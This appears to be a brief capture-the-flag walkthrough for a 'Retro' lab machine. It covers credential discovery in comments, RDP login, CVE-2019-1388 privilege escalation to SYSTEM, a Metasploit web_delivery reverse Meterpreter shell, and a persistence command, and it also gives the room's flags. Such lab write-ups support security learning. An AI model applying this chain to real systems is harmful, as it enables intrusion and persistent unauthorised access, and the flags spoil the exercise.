	Directory found : /retro
Navigate to /retro:
	Potential username : wade
	Navigating through comments we found an potential password : parzival
Lets try to login via MSRDP:
	We can use remmina for that.
	We are in.
	We can read user.txt : THM{HACK_PLAYER_ONE}
	
	We found the cve user was searching : CVE-2019-1388
	The user also left a file which we can use to gain internet explorer running as admin by going to show more details and viewing the certificate.
	
	We can use this to gain admin shells.
		we can use ^S for getting a file browser and we can execute cmd from there it will ben and administrator shell.
		just write cmd in file address bar and hit enter. we got an admin shell.

	We can now navigate to admins desktop to get the flag.
	
	We got the flag : THM{COIN_OPERATED_EXPLOITATION}
	Also we are running as nt authority\system.
	

	Now Lets use metasploit for getting a reverse shell back to our machine.
	We can use exploit/multi/script/web_delivery
	Set powershell as target
	Set lhost and lport
	set payload to windows/meterpreter/reverse_http
	run the exploit in backgroud
	copy the powershell exploit provided by metasploit and runit from the command prompt in target machine.
	wait for some time, we will get a reverse meterpreter shell.
	
	run persistence -X -r IP -p port : for persistence.
